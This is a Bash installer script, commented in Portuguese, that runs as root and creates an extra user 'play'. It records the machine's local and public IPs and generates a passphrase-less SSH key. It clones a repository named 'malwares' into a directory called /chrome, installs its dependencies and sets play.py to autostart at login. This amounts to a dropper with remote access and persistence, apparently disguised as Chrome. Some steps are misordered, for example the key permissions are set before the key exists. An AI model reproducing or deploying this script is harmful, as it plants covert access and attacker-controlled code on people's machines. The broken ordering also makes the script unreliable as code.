#!/bin/bash

# sudo bash start_linux.sh
# Verifica se o script está sendo executado como root
if [[ $EUID -ne 0 ]]; then
    echo "Este script precisa ser executado como root."
    exit 1
fi

# Configurações
venv_name="chrome"
venv_dir="$(pwd)/chrome/venv"
python_executable="python"
username="$USER"
usernameb="play"
repository_url="https://github.com/efraim-lima/malwares"
relative_path="./modules/play.py"
install_directory="/chrome"
ssh_port="22"
ssh_dir="$HOME/.ssh"
ssh_key="$ssh_dir/id_rsa"
output_file="ssh_info.txt"

# Criação de um novo usuário
useradd -m "$usernameb"

# Detectar o endereço IP local
ip=$(hostname -I | awk '{print $1}')

# Obter o IP público usando o serviço ipify
public_ip=$(curl -s https://api.ipify.org)

# Define as permissões corretas para a chave
chown -R $username:$username "$ssh_dir"
chmod 700 "$ssh_dir"
chmod 600 "$ssh_key"

# Exporta informações para o arquivo de saída
output_path="$HOME/$output_file"
echo "Chave SSH: $ssh_key" > "$output_path"
echo "Nome de usuário: $usernameb" >> "$output_path"
echo "IP da máquina: $ip" >> "$output_path"
echo "IP público: $public_ip" >> "$output_path"

echo "Chave SSH criada com sucesso. As informações foram exportadas para o arquivo $output_file."
echo "Agora você pode acessar sua máquina remotamente via terminal usando:"
echo "ssh -p $ssh_port $usernameb@$ip"

# Criação da chave SSH
mkdir -p "$ssh_dir"
ssh-keygen -t rsa -b 4096 -f "$ssh_key" -N ""

# Clone o repositório com permissões do usuário atual
if [ ! -d "$install_directory" ]; then
    sudo -u $username git clone "$repository_url" "$install_directory"
else
    echo "O diretório de instalação $install_directory já existe."
fi

# Criação do ambiente virtual
if [ ! -d "$venv_dir" ]; then
    sudo -u $username $python_executable -m venv "$venv_dir"
else
    echo "O diretório de ambiente virtual $venv_dir já existe."
fi

# Instalação das dependências do requirements.txt (opcional)
if [ -f "$install_directory/requirements.txt" ]; then
    sudo -u $username bash -c "source $venv_dir/bin/activate && pip install -r $install_directory/requirements.txt"
else
    echo "O arquivo requirements.txt não foi encontrado."
fi

# Adiciona o script play.py para ser executado na inicialização do sistema
startup_dir="$HOME/.config/autostart"
startup_script="$startup_dir/play_startup.desktop"

# Cria o arquivo de inicialização
echo "[Desktop Entry]" > "$startup_script"
echo "Type=Application" >> "$startup_script"
echo "Exec=python $PWD/$relative_path" >> "$startup_script"
echo "Hidden=false" >> "$startup_script"
echo "NoDisplay=false" >> "$startup_script"
echo "X-GNOME-Autostart-enabled=true" >> "$startup_script"
echo "Name[en_US]=Play Startup" >> "$startup_script"
echo "Name=Play Startup" >> "$startup_script"

# Define as permissões corretas para o arquivo de inicialização
chmod +x "$startup_script"

echo "O script play.py foi configurado para ser executado na inicialização do sistema."
echo "Reinicie o sistema para iniciar a execução automática."
